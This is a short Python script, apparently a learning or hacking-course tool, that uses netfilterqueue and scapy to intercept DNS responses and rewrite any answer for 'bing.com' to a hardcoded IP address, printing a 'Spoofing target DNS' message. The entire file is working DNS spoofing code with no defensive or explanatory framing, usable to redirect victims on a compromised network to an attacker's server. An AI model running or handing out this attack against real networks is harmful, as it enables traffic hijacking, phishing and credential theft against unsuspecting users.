import netfilterqueue
from scapy.layers.inet import IP, UDP
from scapy.layers.dns import DNSRR, DNSQR, DNS


redirect_to = '195.248.234.67'


def process_packet(packet):
    scapy_packet = IP(packet.get_payload())

    if scapy_packet.haslayer(DNSRR):
        qname = scapy_packet[DNSQR].qname

        if 'bing.com' in qname:
            print('[+] Spoofing target DNS')
            response = DNSRR(rrname=qname, rdata=redirect_to)
            scapy_packet[DNS].an = response
            scapy_packet[DNS].ancount = 1

            del scapy_packet[IP].len
            del scapy_packet[IP].checksum
            del scapy_packet[UDP].len
            del scapy_packet[UDP].checksum

            packet.set_payload(str(scapy_packet))
    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
